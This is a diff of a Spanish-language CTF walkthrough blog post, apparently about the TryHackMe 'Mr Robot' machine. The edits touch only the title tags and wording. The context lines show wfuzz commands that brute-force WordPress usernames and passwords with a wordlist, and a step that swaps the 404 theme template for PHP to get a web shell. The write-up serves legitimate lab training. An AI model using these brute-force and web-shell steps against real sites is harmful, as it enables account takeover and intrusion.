@@ -1,5 +1,5 @@
 ---
-title: Máquina|Mr Robot|THM
+title: Máquina|Mr Robot|THM|EC|NMAP
 published: True
 ---
 
@@ -53,11 +53,11 @@ robots.txt | wp-login.php, del resto solo es codigo de estado 301, ahora vamos a
 > wfuzz -t 200 -c --hs "Invalid username" -z file,fsocity.dic  -d "log=FUZZ&pwd=NULL" http://10.10.94.16/wp-login.php
 >
 <img src="/imgs/mrRobot/mrRobot9.png"/>
-* <p>Ok tenemos ya el username Eliot nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
+* <p>Tenemos ya el usuario Eliot nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
 > wfuzz -t 200 -c --hc=200  -z file,fsocity.dic -d "log=Elliot&pwd=FUZZ" http://10.10.94.16/wp-login.php
 >
 <img src="/imgs/mrRobot/mrRobot10.png"/>
-* <p>Ok listo ahora tenemos la contraseña del usuario Elliot, ahora solo queda iniciar session en el wp-login.php.</p>
+* <p>Listo ahora tenemos la contraseña del usuario Elliot, ahora solo queda iniciar session en el wp-login.php.</p>
 >
 <img src="/imgs/mrRobot/mrRobot11.png"/>
 * <p>Una vez adentro tenemos que ganar acceso por medio de una web-shell, para ello me ire a apariencia y la seccion 404. quitare todo el codigo php y lo remplazare por el siguiente</p>
